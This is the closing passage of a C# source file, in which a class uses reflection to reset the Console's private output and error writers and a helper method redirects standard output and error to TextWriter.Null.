            _out.SetValue(null, null);
            _error.SetValue(null, null);

            _InitializeStdOutError.Invoke(null, new object[] { true });
        }

        static void SetOutAndErrorNull()
        {
            Console.SetOut(TextWriter.Null);
            Console.SetError(TextWriter.Null);
        }
    }
}
